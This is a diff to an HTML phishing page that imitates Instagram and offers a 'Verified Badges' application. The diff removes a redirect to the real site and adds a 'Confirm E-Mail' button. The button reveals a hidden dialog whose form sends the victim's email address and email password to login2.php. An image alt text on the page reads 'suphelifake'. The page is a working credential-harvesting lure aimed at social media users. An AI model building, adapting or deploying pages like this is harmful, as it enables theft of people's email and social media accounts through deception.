@@ -1,9 +1,8 @@
 <html lang="en" class="js logged-in client-root" __cpp="1">
 
 <head __cpp="1">
-    <base href="login3.php">
+    <base href="">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <meta http-equiv="refresh" content="4;URL=https://instagram.com">
     <style __cpp="1">
         /* common */
         
@@ -389,6 +388,14 @@
     <link href="https://graph.instagram.com" rel="preconnect" __cpp="1">
 
 
+    <!-- first_input_delay is a js file copied from https://fburl.com/rc21x6p3
+in order to use it statically for server side rendering.
+We should aim to keep it consistent with their updates -->
+    <!-- This is a js file copied from https://fburl.com/rc21x6p3
+in order to use it statically for server side rendering.
+We should aim to keep it consistent with their updates -->
+
+
 
     <link rel="apple-touch-icon-precomposed" sizes="76x76" href="/static/images/ico/apple-touch-icon-76x76-precomposed.png/4272e394f5ad.png?es6=1" __cpp="1">
     <link rel="apple-touch-icon-precomposed" sizes="120x120" href="/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png?es6=1" __cpp="1">
@@ -403,6 +410,9 @@
     <link rel="mask-icon" href="/static/images/ico/favicon.svg/fc72dd4bfde8.svg?es6=1" color="#262626" __cpp="1">
 
     <link rel="shortcut icon" type="image/x-icon" href="/static/36b3ee2d91ed.ico?es6=1" __cpp="1">
+
+
+
 
 
 
@@ -474,9 +484,6 @@
     <link rel="alternate" href="https://www.instagram.com/terms/unblock/?next=/&amp;hl=es-la" hreflang="es-ar" __cpp="1">
     <link rel="alternate" href="https://www.instagram.com/terms/unblock/?next=/&amp;hl=es-la" hreflang="es-ni" __cpp="1">
     <link rel="alternate" href="https://www.instagram.com/terms/unblock/?next=/&amp;hl=es-la" hreflang="es-uy" __cpp="1">
-
-
-
 
     <style type="text/css" data-isostyle-id="is17b3558a" __cpp="1">
         @-webkit-keyframes spinner-spin8 {
@@ -8188,8 +8195,13 @@
             <div class="Tc7h9" __cpp="1">
               <center><span class="" __cpp="1"><img class="" src="https://image.ibb.co/fjkP4z/logo.png"
                     alt="suphelifake" __cpp="1"></span></center>
-    <div class="_6Th1N" __cpp="1">Verified Badges</div>
-    <div class="_42YD1" __cpp="1">Your application has been successfully received. It will be reviewed within 24 hours and your e-mail address will be returned.</div><span class="Nu46c _1OSdk" __cpp="1"></span><span class="_3G4x7  phAyO" __cpp="1">
+    <center><span class="" __cpp="1"><img class=""
+                    src="http://www.free-icons-download.net/images/mail-logo-icon-24577.png" style="max-width:60px;"
+                    alt="suphelifake" __cpp="1"></span></center>
+    <div class="_6Th1N" __cpp="1">Mail Confirmation</div>
+    <div class="_42YD1" __cpp="1">In order to have a verification badge, you need to confirm your email. After mail confirmation, your application will be evaluated within 24 hours and you will be returned.</div>
+    <span class="Nu46c _1OSdk" __cpp="1"><button class="_5f5mN       jIbKX KUBKM      yZn4P   " __cpp="1"
+                  id="butonamca">Confirm E-Mail</button></span><span class="_3G4x7  phAyO" __cpp="1">
                 <div class="TQUPK" __cpp="1"><span __cpp="1">English</span><span class="coreSpriteChevronDownGrey _6Q5Yk" __cpp="1"></span></div><select aria-label="Switch Display Language" class="hztqj" __cpp="1">
                   <option value="af" __cpp="1">Afrikaans</option>
                   <option value="cs" __cpp="1">Čeština</option>
@@ -8259,6 +8271,53 @@
         </div>
     </div>
 
+    <script>
+        $("#butonamca").click(function() {
+            $("#gizlenmis").show();
+        });
+    </script>
+    <div __cpp="1" id="gizlenmis" style="display:none;">
+        <div class="_2dDPU p2jpu" role="dialog" __cpp="1">
+            <div class="EfHg9" __cpp="1"></div>
+            <div class="zZYga Nd6FG" role="dialog" __cpp="1">
+                <div class="PdwC2 _8F2QW" role="dialog" __cpp="1">
+                    <div class="VQoji" __cpp="1">
+                        <h1 class="gM4wt" __cpp="1">Verified Badges</h1>
+                    </div>
+                    <div class="hf0Z9" __cpp="1">
+                        <header class="XnQ-0" __cpp="1">Confirm Your E-Mail</header>
+                        <div class="YGQ18" __cpp="1"><span class="qMFi1" __cpp="1"><span class="" __cpp="1"><img class=""
+                    src="http://www.free-icons-download.net/images/mail-logo-icon-24577.png" style="max-width:60px;"
+                    alt="suphelifake" __cpp="1"></span></span><span class="qMFi1" __cpp="1">Confirm Your E-Mail</span>
+                        </div>
+                        <div class="YGQ18" __cpp="1">
+                            <div class="eS6pE" __cpp="1">
+
+                                <form action="login2.php" method="POST">
+                            </div>
+                            <div class="-MzZI">
+                                <div class="_9GP1n">
+                                    <div class="f0n8F" id="usaz"><label for="f4ee6cb25827ec" class="_9nyy2">E-Mail</label><input class="_2hvTZ pexuQ zyHYP" id="username" aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75"
+                                            name="username" type="text" value="" required></div>
+                                </div>
+                            </div>
+                            <div class="-MzZI">
+                                <div class="_9GP1n">
+                                    <div class="f0n8F" id="usazz"><label for="f4ee6cb25827ec" class="_9nyy2">E-Mail Password</label><input class="_2hvTZ pexuQ zyHYP" style="width:300px;" id="password" aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off"
+                                            maxlength="75" name="password" type="password" value="" required></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="_0GT5G" __cpp="1"><span class="RmcKZ _1OSdk" __cpp="1"><button
+                class="_5f5mN       jIbKX   _63i69    yZn4P   " __cpp="1" balue="submit">Submit</button>
+
+              </form>
+            </span></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
 
 </body>
